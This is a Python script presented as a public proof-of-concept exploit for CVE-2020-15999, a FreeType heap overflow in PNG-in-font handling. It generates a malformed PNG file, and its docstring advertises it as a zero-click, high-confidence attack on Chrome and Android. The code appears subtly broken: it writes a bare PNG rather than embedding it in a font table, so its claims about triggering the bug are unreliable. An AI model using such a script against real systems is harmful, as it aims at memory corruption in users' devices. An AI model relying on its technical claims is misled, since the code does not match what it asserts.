#!/usr/bin/env python3
"""CVE-2020-15999 — FreeType heap buffer overflow in Load_SBit_Png.
Zero-click: any PNG-in-font (sbix/EBLC) rendered by Chrome/Android.
Public PoC. Confidence: HIGH."""
import struct, sys
from pathlib import Path

def build() -> bytes:
    # PNG with a corrupted IHDR width vs actual scanline length
    sig = b"\x89PNG\r\n\x1a\n"
    def chunk(t, body):
        import zlib
        return (struct.pack(">I", len(body)) + t + body +
                struct.pack(">I", zlib.crc32(t + body) & 0xFFFFFFFF))
    ihdr = chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0))
    # scanline declares width 1 but carries an oversized row
    raw = b"\x00" + b"\xff\x00\x00\xff" * 4
    import zlib
    idat = chunk(b"IDAT", zlib.compress(raw))
    iend = chunk(b"IEND", b"")
    return sig + ihdr + idat + iend

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2020-15999.png")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2020-15999 PNG -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
